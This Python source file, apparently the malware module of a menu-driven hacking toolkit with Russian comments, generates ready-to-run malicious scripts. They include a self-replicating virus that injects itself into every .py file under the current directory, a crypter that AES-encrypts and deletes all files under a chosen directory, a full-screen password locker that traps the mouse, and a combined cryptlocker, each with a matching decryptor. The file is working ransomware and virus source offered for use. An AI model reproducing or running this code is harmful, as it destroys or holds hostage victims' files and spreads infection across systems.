from Modules import HEAD, TERM
def choose(): 
	mlwr="" # Создаём нулевую переменную
	while mlwr not in TERM.Command_ADDT["Back"]: 
		mlwr=input("[root@"+TERM.Hostname+" mlwr]# ")
		if   mlwr in TERM.Command_MLWR["Locker"]: locker() # При единице сработает функция locker
		elif mlwr in TERM.Command_MLWR["Crypter"]: crypter() # При двойке сработает функция ml_cryptographer		
		elif mlwr in TERM.Command_MLWR["Cryptlocker"]: cryptlocker() # При тройке сработает функция ml_cryptlock
		elif mlwr in TERM.Command_MLWR["Py-virus"]: pyvirus() # При четвёрке сработает функция ml_pyvirus
		elif mlwr in TERM.Command_ADDT["Check"]: title() # Проверка модулей
		elif mlwr in TERM.Command_ADDT["Help"]: HEAD.help() # Предоставление информации о командах
		elif mlwr in TERM.Command_ADDT["Info"]: HEAD.info() # Дополнительная информация
		elif mlwr in TERM.Command_ADDT["Clear"]: HEAD.clear() # Очистка истории
		elif mlwr in TERM.Command_ADDT["Back"]: continue # Выход из модуля
		elif mlwr in TERM.Command_ADDT["Exit"]: raise SystemExit # Выход из программы
		else: print("?:",mlwr,":command not found")  # Если не указаны вышеперечисленные условия

def title(): # Предоставление информации о модуле Malware
	print(HEAD.Line["full-"]+"\n[>] Write the number:")
	print("\t1) LOCKER.571\n\t2) CRYPTER.571\n\t3) CRYPTLOCKER.571\n\t4) PYVIRUS.571\n"+HEAD.Line["full-"])

def pyvirus(): # Вирус
	print(HEAD.Line["full-"]+"\n"+HEAD.Line["mlwr"]+"\n"+HEAD.Line["full-"])
	code=('''#STARTED#
import sys, os # Вирус питон скриптов
def virus(python): # Функция проверки и распространения вируса 
	begin="#STARTED#\\n"; end="#STOPPED#\\n" # Объявление переменных начала и конца строк
	with open(sys.argv[0],"r") as copy: # Открытие запущенного файла
		k=0; virus_code="\\n" # Объявление переменной-счётчика и начала строки вирус-кода
		for line in copy: # Построчное прочтение файла
			if line==begin: k=1; virus_code+=begin # Если строка начинается с begin, то вирус найден
			elif k==1 and line!=end: virus_code+=line # Копировать строки
			elif line==end: virus_code+=end; break # Если строка заканчивается end, то прекратить копирование 
			else: pass # Пропускать линии
	with open(python,"r") as file: # Открытие и чтение файла-жертвы на наличие вируса
		origin_code="" # Объявление переменной
		for line in file: # Построчное чтение файла
			origin_code+=line # Добавлять каждую строку в переменную
			if line==begin: Virus=True; break # Если вирус был найден в файле, то прекратить дальнейшую проверку
			else: Virus=False # Иначе продолжать до тех пор, пока файл не будет полностью прочитан
	if Virus==False: # Если вирус не был обнаружен
		with open(python,"w") as paste: # Перезаписать файл
			paste.write(virus_code+"\\n\\n"+origin_code) # Вставить сначала вирус код, а далее вставить оригинальный код программы
	else: pass # Если вирус был найден - пропустить
def code(): # Функция дополнительного кода
	print("Infected") # Ваш дополнительный код
code() # Выполнение функции
def walk(dir): # Функция парсинга директорий
	for name in os.listdir(dir): # Парсинг файлов и директорий в указанной директории
		path = os.path.join(dir, name) # Полный путь к файлу или директории
		if os.path.isfile(path): # Если полный путь является файлом
			if os.path.splitext(path)[1]==".py": # И если расширение является .py
				virus(path) # Выполнить функцию virus и передать файл
			else: pass # Иначе, если другое расширение - пропустить
		else: walk(path) # Иначе, если это директория, перейти в неё
walk(os.getcwd()) # Указание корневой директории
#STOPPED#''')
	file="pyvirus.py" # Имя файла - вируса
	with open(file,"w") as virus: 
		virus.write(code)
		print("[+] File '"+file+"' successfully saved!\n"+HEAD.Line["full-"])

def crypter(): # Шифровальщик
	print(HEAD.Line["full-"]+"\n"+HEAD.Line["mlwr"]+"\n"+HEAD.Line["full-"])
	direct=input("Write the root directory: ") # Корневая директория разрастания шифровальщика
	password=input("Write the password: ") # Пароль для шифровки / расшифровки
	with open("crypt.py","w") as crypt: 
		crypt.write('''
import os, sys # Модули для парсинга директорий (os) и удаления первоначального файла (sys)
def crypt(file): # Функция для зашифровки файла
	import pyAesCrypt # Модуль для зашифровки/расшифровки файлов
	print("'''+HEAD.Line["full-"]+'''")
	password="'''+str(password)+'''" # Указываем пароль
	bufferSize = 512*1024 # Указываем размер буфера (чем больше файл, тем больше ставьте размер буфера)
	pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize) # Зашифровка файла
	print("[crypted] '"+str(file)+".crp'")
	os.remove(file) # Удаление незашифрованного файла
def walk(dir): # Функция парсинга директорий 
	for name in os.listdir(dir): # Парсинг файлов и директорий в указанной директории
		path = os.path.join(dir, name) # Полный путь к файлу или директории
		if os.path.isfile(path): crypt(path) # Если полный путь является файлом - зашифровать
		else: walk(path) # Иначе, если это директория, перейти в неё
walk("'''+str(direct)+'''") # Указание корневой директории
print("'''+HEAD.Line["full-"]+'''")
os.remove(str(sys.argv[0]))''')
		print(HEAD.Line["full-"]+"\n[+] File 'crypt.py' successfully saved!")
	with open("key.py","w") as key: 
		key.write('''
import os, sys # Модули для парсинга директорий (os) и удаления первоначального файла (sys)
def decrypt(file):
	import pyAesCrypt # Модуль для зашифровки/расшифровки файлов
	print("'''+HEAD.Line["full-"]+'''")
	password="'''+str(password)+'''" # Вводим пароль
	bufferSize = 512*1024 # Указываем размер буфера (чем больше файл, тем больше ставьте размер буфера)
	pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize) # Расашифровка файла
	print("[decrypted] '"+str(os.path.splitext(file)[0])+"'")
	os.remove(file) # Удаление зашифрованного файла
def walk(dir): # Функция парсинга директорий 
	for name in os.listdir(dir): # Парсинг файлов и директорий в указанной директории
		path = os.path.join(dir, name) # Полный путь к файлу или директории
		if os.path.isfile(path): # Если полный путь является файлом
			try: decrypt(path) # Попробывать расшифровать
			except: pass # Иначе файл не зашифрован
		else: walk(path) # Иначе, если это директория, перейти в неё
walk("'''+str(direct)+'''") # Указание корневой директории
print("'''+HEAD.Line["full-"]+'''")
os.remove(str(sys.argv[0]))''') 
		print("[+] File 'key.py' successfully saved!\n"+HEAD.Line["full-"])

def locker(): # Локер
	print(HEAD.Line["full-"]+"\n"+HEAD.Line["mlwr"]+"\n"+HEAD.Line["full-"])
	pasw=input("Set the password: ") # Указание пароля
	with open("locker.py","w") as file: 
		file.write('''
from tkinter import Tk,Entry,Label # Модуль tkinter для отображения графических окон
from time import sleep # Модуль time для функциональности
from pyautogui import click, moveTo # Модуль pyautogui для затруднения пользования
def check(event): # Функция для просмотра условия
	global k,entry # Объявление глобальных переменных
	if entry.get()=="'''+str(pasw)+'''": k=True # Если пароль верный, то остановить цикл
def block(): # Функция отображения локера
	click(675, 420) # Кликать на координаты 675 420
	moveTo(675, 420) # Перемещать курсор на координаты 675 420
	root.attributes("-fullscreen",True) # Окно во весь экран
	root.protocol("WM_DELETE_WINDOW", block) # Если будут задействованы горячие клавиши завершения программы- выполнится заного функция
	root.update() # Обновить отображение локера
	root.bind('<Control-KeyPress-c>', check) # Если комбинация клавиш Ctrl-C - выполнить функцию check
root=Tk() # Открытие окна локера
root.title("Locker") # Имя программы
root.attributes("-fullscreen",True) # Установка окна во весь экран
entry=Entry(root,font=1) # Объявление поля ввода
label0=Label(root,text="Locker_by_#571",font=1) # Объявление надписи 
label0.grid(row=0,column=0) # Установка надписи
label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20') # Объявление надписи
label1.place(x=470,y=300) # Устновка надписи
entry.place(width=150,height=50,x=600,y=400) # Установка поля ввода
root.update(); sleep(0.2) # Обновить отображение локера и ничего не делать 0.2 секунды
click(675, 420) # Кликнуть один раз на координаты 675 420
k=False # Пока k=False - выполнять функцию block
while k!=True: block()''')
		print("[+] File 'locker.py' successfully saved!\n"+HEAD.Line["full-"]) # Завершение программы

def cryptlocker(): # Шифровальщик + Локер
	print(HEAD.Line["full-"]+"\n"+HEAD.Line["mlwr"]+"\n"+HEAD.Line["full-"])
	direct=input("Write the root directory for crypt: ") # Директория с которой начнёт действовать шифрование по методу tree
	password=input("Write the password for crypter: "); pasw=input("Write the password for locker: ") # Пароли для шифровальщика и локера
	with open("cryptlocker.py","w") as crypt: 
		crypt.write('''
import os, sys, pyAesCrypt # Модули для парсинга директорий (os), удаления первоначального файла (sys) и зашифровки файлов (pyAesCrypt)
from threading import * # Модуль для связки программ
from pyautogui import click, moveTo # Модуль pyautogui для затруднения пользования
from tkinter import Tk,Entry,Label # Модуль tkinter для отображения графических окон
from time import sleep # Модуль time для функциональности
def locker(): # Функция создания локера
	def callback(event): # Функция для просмотра условия
		global k,entry # Объявление глобальных переменных
		if entry.get()=="'''+str(pasw)+'''": k=True # Если пароль верный, то остановить цикл
	def block(): # Функция отображения локера
		click(675, 420) # Кликать на координаты 675 420
		moveTo(675, 420) # Перемещать курсор на координаты 675 420
		root.attributes("-fullscreen",True) # Окно во весь экран
		root.protocol("WM_DELETE_WINDOW", block) # Если будут задействованы горячие клавиши завершения программы- выполнится заного функция
		root.update() # Обновить отображение локера
		root.bind('<Control-KeyPress-c>', callback) # Если комбинация клавиш Ctrl-C - выполнить функцию callback
	global k,entry # Объявление глобальных переменных
	root = Tk() # Открытие окна локера
	root.title("Locker") # Имя программы
	root.attributes("-fullscreen",True) # Установка окна во весь экран
	entry = Entry(root,font=1) # Объявление поля ввода
	label0=Label(root,text="Locker_by_#571",font=1) # Объявление надписи 
	label0.grid(row=0,column=0) # Установка надписи
	label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20') # Объявление надписи
	label1.place(x=470,y=300) # Устновка надписи
	entry.place(width=150,height=50,x=600,y=400) # Установка поля ввода
	root.update(); sleep(0.2) # Обновить отображение локера и ничего не делать 0.2 секунды
	click(675, 420) # Кликнуть один раз на координаты 675 420
	k=False # Пока k=False - выполнять функцию block
	while k!=True: block() # Пока k=False - выполнять функцию block
def crypter(): # Функция создания шифровальщика
	def crypt(file):# Функция для зашифровки файла
		print("'''+HEAD.Line["full-"]+'''")
		password="'''+str(password)+'''" # Указываем пароль
		bufferSize = 512*1024 # Указываем размер буфера (чем больше файл, тем больше ставьте размер буфера)
		pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize) # Зашифровка файла
		print("[crypted] '"+str(file)+".crp'")
		os.remove(file) # Удаление незашифрованного файла
	def walk(dir): # Функция парсинга директорий 
		for name in os.listdir(dir):  # Парсинг файлов и директорий в указанной директории
			path = os.path.join(dir, name) # Полный путь к файлу или директории
			if os.path.isfile(path): crypt(path) # Если полный путь является файлом - зашифровать
			else: walk(path) # Иначе, если это директория, перейти в неё
	walk("'''+str(direct)+'''") # Указание корневой директории
	print("'''+HEAD.Line["full-"]+'''")
	os.remove(str(sys.argv[0])) # Удалить текущий файл-шифровальщик
thread_1 = Thread(target=locker) # Добавление в многопоточность функцию локер
thread_2 = Thread(target=crypter) # Добавление в многопоточность функцию шифровальщик
thread_1.start(); thread_2.start() # Включение многопоточности у обоих функций
thread_1.join(); thread_2.join() # Объединение функций''')
		print(HEAD.Line["full-"]+"\n[+] File 'cryptlocker.py' successfully saved!") # Завершение программы
	with open("key.py","w") as key: 
		key.write('''
import os, sys # Модули для парсинга директорий (os) и удаления первоначального файла (sys)
def decrypt(file): # Функция для расшифровки файла
	import pyAesCrypt # Модуль для зашифровки / расшифровки файлов
	print("'''+HEAD.Line["full-"]+'''")
	password="'''+str(password)+'''" # Вводим пароль
	bufferSize = 512*1024 # Указываем размер буфера (чем больше файл, тем больше ставьте размер буфера)
	pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize) # Расшифровка файла
	print("[decrypted] '"+str(os.path.splitext(file)[0])+"'")
	os.remove(file) # Удаление зашифрованного файла
def walk(dir): # Функция парсинга директорий 
	for name in os.listdir(dir): # Парсинг файлов и директорий в указанной директории
		path = os.path.join(dir, name) # Полный путь к файлу или директории
		if os.path.isfile(path): 
			try: decrypt(path) # Если полный путь является файлом - зашифровать
			except: pass # Если файл не зашифрован - пропустить
		else: walk(path) # Иначе, если это директория, перейти в неё
walk("'''+str(direct)+'''") # Указание корневой директории
print("'''+HEAD.Line["full-"]+'''")
os.remove(str(sys.argv[0])) # Удалить текущий файл-ключ''')
		print("[+] File 'key.py' successfully saved!\n"+HEAD.Line["full-"]) # Завершение программы